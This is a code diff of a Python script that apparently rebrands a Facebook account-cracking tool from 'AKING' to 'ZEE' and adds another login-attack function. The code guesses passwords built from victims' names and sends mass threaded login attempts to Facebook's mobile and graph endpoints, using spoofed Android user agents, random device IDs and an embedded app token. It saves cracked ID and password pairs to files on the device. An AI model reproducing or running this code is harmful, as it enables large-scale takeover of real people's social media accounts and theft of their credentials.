@@ -487,7 +487,7 @@ class Main:
                                 mail = ''.join(random.choice(string.digits) for _ in range(4))
                                 open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         fo = open('.re.txt', 'r').read().splitlines()
-                with tred(max_workers=30) as pool:
+                with tred(max_workers=30) as Aking:
                         total = str(len(fo))
                         clear()
                         print(' Total account : \033[1;32m'+total)
@@ -503,17 +503,17 @@ class Main:
                                 fs = first_name.lower()
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
-                              Aking.submit(rndm,ids,passlist)
+                                Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
                 print(' The process has completed')
                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' Press enter to back ')
-                os.system('python AKING.py')
+                os.system('python mail.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [Zee-F] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -526,7 +526,7 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        head = {"authority": 'm.facebook.com', "method": 'GET', "scheme": 'https', "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9', "accept-encoding": 'gzip, deflate, br', "accept-language": 'en-US,en;q=0.9', "cache-control": 'max-age=0', "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"', "sec-ch-ua-mobile": '?1', "sec-ch-ua-platform": '"Android"', "sec-fetch-dest": 'document', "sec-fetch-mode": 'navigate', "sec-fetch-site": 'none', "sec-fetch-user": '?1', "upgrade-insecure-requests": '1', "user-agent": ua,}
                         getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
@@ -534,14 +534,14 @@ def ffb(ids,names,passlist):
                         if "c_user" in Aking:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print('\r\r\033[1;32m [AKING-OK] %s | %s'%(ids,pas))
-                                open('/sdcard/AKING-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                print('\r\r\033[1;32m [ZEE-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/ZEE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Aking:
                                 if 'y' in pcp:
-                                        print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [Zee-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ZEE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -555,7 +555,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [ZEE-F] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -605,27 +605,100 @@ def api(ids,names,passlist):
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
-                                        print('\r\r\033[1;32m [AKING-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/AKING-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\033[1;32m [ZEE-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ZEE-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                                 elif 'www.facebook.com' in q['error_msg']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;208m [AKING-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[38;5;208m [ZEE-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/ZEE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                 else:
                                         continue
                         loop+=1
-			 except requests.exceptions.ConnectionError:
+                except requests.exceptions.ConnectionError:
+                        time.sleep(10)
+                except Exception as e:
+                        pass
+def api1(ids,names,passlist):
+                try:
+                        global ok,loop
+                        sys.stdout.write('\r\r\033[1;37m [ZEE-F] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        fn = names.split(' ')[0]
+                        try:
+                                ln = names.split(' ')[1]
+                        except:
+                                ln = fn
+                        for pw in passlist:
+                                pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
+                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
+                                application_version_code=str(random.randint(000000000,999999999))
+                                fbs=random.choice(fbks)
+                                gtt=random.choice(xxxxx)
+                                gttt=random.choice(xxxxx)
+                                android_version=str(random.randrange(6,13))
+                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                device_id = str(uuid.uuid4())
+                                adid = str(uuid.uuid4())
+                                data = {'adid':adid,
+                                        'email':ids,
+                                        'password':pas,
+                                        'cpl':'true',
+                                        'credentials_type':'device_based_login_password',
+                                        "source": "device_based_login",
+                                        'error_detail_type':'button_with_disabled',
+                                        'source':'login','format':'json',
+                                        'generate_session_cookies':'1',
+                                        'generate_analytics_claim':'1',
+                                        'generate_machine_id':'1',
+                                        "locale":"es_CU","client_country_code":"CU",
+                                        'device':gtt,
+                                        'device_id':adid,
+                                        "method": "auth.login",
+                                        "fb_api_req_friendly_name": "authenticate",
+                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
+                                head = {
+                                        'content-type':'application/x-www-form-urlencoded',
+                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
+                                        'x-fb-connection-type':'unknown',
+                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                                        'user-agent':ua_string,
+                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
+                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
+                                        'x-fb-connection-quality':'EXCELLENT',
+                                        'x-fb-friendly-name':'authenticate',
+                                        'accept-encoding':'gzip, deflate',
+                                        'x-fb-http-engine':     'Liger'}
+                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
+                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
+                                q = json.loads(po)
+                                if 'session_key' in q:
+                                        print('\r\r\033[1;32m [ZEE-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/ZEE-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        oks.append(ids)
+                                        break
+                                elif 'www.facebook.com' in q['error']['message']:
+                                        if 'y' in pcp:
+                                                print('\r\r\x1b[38;5;208m [ZEE-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/ZEE-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                cps.append(ids)
+                                                break
+                                        else:
+                                                open('/sdcard/ZEE-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                break
+                                else:
+                                        continue
+                        loop+=1
+                except requests.exceptions.ConnectionError:
                         time.sleep(10)
                 except Exception as e:
                         pass
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [ZEE-F] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -674,13 +747,13 @@ def rndm(ids,passlist):
                                                 okk=open('/sdcard/AKING-OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                        open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        print('\r\r\033[1;32m [ZEE-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                        open('/sdcard/ZEE-OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;32m [AKING-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/AKING-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;32m [ZEE-OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/ZEE-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
